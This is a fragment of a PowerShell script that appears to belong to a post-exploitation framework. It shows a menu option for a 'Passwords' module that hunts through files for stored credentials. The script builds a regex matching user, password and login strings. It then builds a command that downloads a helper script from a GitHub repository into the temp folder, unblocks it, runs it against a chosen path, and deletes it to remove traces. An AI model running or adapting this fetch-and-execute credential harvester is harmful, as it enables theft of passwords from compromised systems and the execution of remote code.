...
"@;Write-Host $AnwsomeBanner
      ...
      If($choise -ieq "Passwords" -or $choise -ieq "pass")
      {
        ...
        write-host "   Remark: Scan takes aprox 4 minuts (default settings)" -ForegroundColor Yellow
        write-host "`n`n   Modules   Description              Privileges Required" -ForegroundColor green;
        write-host "   -------   -----------              ------------------";
        write-host "   Start     Search creds in files    UserLand";
        write-host "   Return    Return to Server Main Menu" -ForeGroundColor yellow;
        ...
        If($pass_choise -ieq "Start")
        {
          ...
          If(-not($String))
          {
             $String = "(^(\s+U|U)ser.{0,6}(=|:).[^$]{0,22}$)|(^(\s+p|\s+cp|cp|p)ass.{0,6}(=|:).{0,22}$)|(^(\s+p|p)wd.{0,2}(=|:).{0,22}$)|(`"password`":)|(`"username`":)|(log(i|o)n.{0,2}(=|:).[^$]{0,22}$)"
          ...
          $Command = "iwr -uri `"https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/Find-Strings.ps1`" -OutFile `"`$Env:TMP\Find-Strings.ps1`"|Unblock-File;powershell -File `"`$Env:TMP\Find-Strings.ps1`" -Path `"$Recursive_search`" -String `"$String`" -strlength `"$MaxLength`";Remove-Item -Path `"`$Env:TMP\Find-Strings.ps1`" -Force";
        }
